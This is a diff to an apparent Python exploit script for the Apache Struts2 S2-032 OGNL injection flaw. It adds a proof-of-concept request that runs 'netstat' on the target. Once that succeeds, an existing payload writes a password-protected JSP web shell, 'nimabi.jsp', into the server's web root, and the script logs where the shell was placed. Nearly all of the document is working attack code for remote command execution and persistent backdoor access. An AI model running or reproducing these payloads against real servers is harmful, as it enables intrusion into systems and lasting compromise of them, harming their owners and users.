@@ -753,23 +753,28 @@ def rceStruts2S2032(value):
 
 def checkS2032(url):    
     url = url.strip()
+    if '?' in url:
+        url = url.split('?')[0]
     #reg = 'http[s]*://.*/$'
     #m = re.match(reg,url)
     #if not m:
     #    url = url + "/"
+
+    poc = url+"?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command[0]%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char[51020]%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command=netstat"
+		
     shellname="nimabi.jsp"
     shellpwd="pwd"
     exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj="+shellname+"&content=gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.getParameter%28%22"+shellpwd+"%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22l%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"
     try:
-        result = exploitS2032(exp)
-        if shellname in result:
-            document_root = result.strip()
+        result = exploitS2032(poc)
+        if "Local Address" in result:
+            shell_path = exploitS2032(exp).strip()
             reg = '(http[s]*://[^/]*/?).*$'
             m = re.search(reg,url)
             if m:
-                url=m.group(1)
-            shell_file = url+shellname
-            vuls='[+] vuls found! url: '+url+', document_root: '+document_root+', shell_file: '+shell_file
+                url_path=m.group(1)
+            shell_file = url_path+shellname
+            vuls='[+] vuls found! url: '+url+', shell_path: '+ shell_path +', shell_file: '+shell_file
             logfile(vuls,'s2032_rce.txt')
             print vuls
         else:
